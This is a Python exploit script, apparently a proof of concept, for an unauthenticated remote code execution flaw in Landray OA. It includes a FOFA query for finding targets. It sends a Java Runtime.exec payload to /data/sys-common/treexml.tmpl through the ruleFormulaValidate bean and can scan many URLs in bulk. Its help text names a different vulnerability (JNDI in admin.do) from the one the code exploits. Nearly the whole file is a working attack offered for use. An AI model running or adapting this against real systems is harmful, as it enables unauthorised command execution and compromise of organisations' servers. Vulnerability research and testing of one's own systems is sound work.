#FOFA: app="Landray-OA系统"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '蓝凌OA 未授权RCE',
        'vulnerable': False,
        'url': target
    }
    cmd = 'whoami'
    timeout = 5
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    payload = '/data/sys-common/treexml.tmpl'
    vurl = urllib.parse.urljoin(target, payload)
    payload_data = '''s_bean=ruleFormulaValidate&script=try {
    String cmd = "%s";
    Process child = Runtime.getRuntime().exec(cmd);
    } catch (IOException e) {
    System.err.println(e);
    }''' % cmd
    try:
        finger_rep = requests.post(vurl, headers=headers, timeout=timeout, verify=False)
        if re.search('参数s_bean不能为空', finger_rep.text):
            rep = requests.post(vurl, headers=headers, timeout=timeout, verify=False, data=payload_data)
            if re.search('公式运行时返回了空值，所以无法校验返回值类型', rep.text) and rep.status_code == 200:
                result['vulnerable'] = True
                result['vurl'] = vurl
                print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("蓝凌OA admin.do JNDI远程命令执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()